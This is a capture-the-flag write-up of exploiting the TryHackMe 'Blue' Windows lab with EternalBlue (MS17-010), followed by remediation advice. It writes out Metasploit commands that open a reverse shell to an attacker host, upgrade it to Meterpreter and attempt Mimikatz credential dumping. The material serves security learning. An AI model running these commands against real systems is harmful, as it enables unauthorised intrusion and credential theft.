# Blue — TryHackMe — Easy — Windows

**Date Completed:** 24 September 2026
**Time to Root:** 30 minutes
**User Flag:** `NT AUTHORITY\SYSTEM (direct SYSTEM-level access via exploit, no privesc chain required)`
**Root Flag:** `flag{access_the_machine}` / `flag{sam_database_elevated_access}` / `flag{admin_documents_can_be_valuable}`

---

## Executive Summary

Blue is a Windows exploitation machine built around MS17-010 (EternalBlue), the NSA-developed SMBv1 exploit leaked by Shadow Brokers in 2017 and later used in the WannaCry and NotPetya ransomware outbreaks. The target — an unpatched Windows Server 2012 R2 instance with SMBv1 enabled — was exploited directly to gain SYSTEM-level remote code execution with no privilege escalation chain required, since the exploit itself grants kernel-level access.

---

## Scope and Methodology

- **Target IP:** 10.80.177.237
- **Platform:** TryHackMe
- **Category:** Windows 
- **Methodology:** Reconnaissance — Enumeration — Exploitation — Privilege Escalation

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sV -sC -p- -T4 10.80.177.237 -oN blue-nmap.txt
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 135 | MSRPC | Microsoft Windows RPC | |
| 139 | NetBIOS-ssn | Microsoft Windows netbios-ssn | |
| 445 | SMB | Windows Server 2012 R2 Datacenter (microsoft-ds) | Entry point |
| 3389 | RDP | Microsoft Terminal Service | Not used |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 | Not used |
| 49152–49198 | MSRPC | Various dynamic RPC ports | |

SMB signing was disabled (dangerous, but default), and the host was identified as Windows Server 2012 R2 Datacenter 9600.

### Vulnerability Confirmation

```bash
sudo nmap --script smb-vuln-ms17-010 10.80.177.237
```

Result: **VULNERABLE** — Remote Code Execution vulnerability in Microsoft SMBv1 servers (CVE-2017-0143), disclosed 2017-03-14.

---

## Enumeration

No further manual enumeration was needed — the nmap NSE script directly confirmed the target was vulnerable to MS17-010, and the exploitation path was already well established (Metasploit's `ms17_010_eternalblue` module).

---

## Exploitation

**Vulnerability Class:** Remote Code Execution via SMBv1 buffer overflow (CVE-2017-0143 / MS17-010 / EternalBlue)

Used Metasploit to exploit the vulnerability directly:

msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.80.177.237
set LHOST 192.168.132.248
set payload windows/x64/shell/reverse_tcp
run


The exploit confirmed the target was vulnerable (`smb_ms17_010` auxiliary check), successfully performed the SMB1 buffer overflow (nonpaged pool allocation, NT Trans manipulation), and returned a command shell.

[*] Command shell session 1 opened (192.168.132.248:4444 -> 10.80.177.237:49246)


The resulting shell was already running at kernel/SYSTEM level, since EternalBlue's exploitation technique operates below user-mode privilege boundaries — no separate privilege escalation step was required.

---

## Privilege Escalation

Not required as a separate step — EternalBlue grants SYSTEM-level code execution directly as part of the exploit itself, since the vulnerability is in the SMB driver operating in kernel space.

To enable further post-exploitation tooling, the raw shell was upgraded to a full Meterpreter session:

background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions -l
sessions -i 2


Confirmed privilege level:

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


Attempted credential dumping with Mimikatz (via Meterpreter's `kiwi` extension):

load kiwi
creds_all
creds_msv


Both `wdigest`/`kerberos` credentials and NTLM (`msv`) hashes returned empty. This is expected on this particular target snapshot — wdigest plaintext caching is disabled by default on Windows Server 2012 R2 and later, and no other cached logon sessions were present to extract NTLM hashes from beyond the SYSTEM context already held.

---

## Proof of Completion

flag{access_the_machine}
flag{sam_database_elevated_access}
flag{admin_documents_can_be_valuable}

---

## Vulnerability Analysis

| Finding | Severity | CVSS | MITRE ATT&CK | CWE |
|---------|----------|------|--------------|-----|
| MS17-010 / EternalBlue SMBv1 RCE | Critical | 9.3 | T1210 (Exploitation of Remote Services) | CWE-119 |
| SMB message signing disabled | Medium | 5.9 | T1557 | CWE-354 |

---

## Remediation

1. **MS17-010 / EternalBlue:** Apply Microsoft's MS17-010 security update immediately — this patch has been available since March 2017. Disable SMBv1 entirely on all systems where it is not explicitly required; it is deprecated and should not be enabled on any modern network.
2. **SMB Signing Disabled:** Enable and enforce SMB message signing to prevent man-in-the-middle relay attacks against SMB traffic.
3. **General Patch Management:** This vulnerability had a patch available two full months before the WannaCry outbreak. Every organisation infected by WannaCry or NotPetya was running unpatched systems — timely patch compliance is not optional for internet- or network-exposed infrastructure.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning, service detection, and MS17-010 vulnerability confirmation via NSE script |
| Metasploit Framework | Exploitation (`ms17_010_eternalblue`), session management |
| Meterpreter | Post-exploitation shell, filesystem search, credential dumping |
| Kiwi (Mimikatz) | Attempted NTLM/wdigest/kerberos credential extraction |

---

## Lessons Learned

- EternalBlue is a kernel-level exploit, meaning there is no separate privilege escalation phase — the initial shell is already SYSTEM. This distinguishes it sharply from most web/Linux CTF machines where privesc is a distinct, separate phase.
- Modern Windows versions (2012 R2 and later) disable wdigest plaintext credential caching by default, which is why `creds_all` and `creds_msv` returned empty here — a good reminder that credential dumping results depend heavily on OS version and configuration, not just on successfully loading kiwi.
- This CVE is a strong real-world example for SOC analyst training: the patch existed two months before WannaCry caused global damage, underscoring that patch management failures — not zero-days — are usually the actual root cause of major incidents.

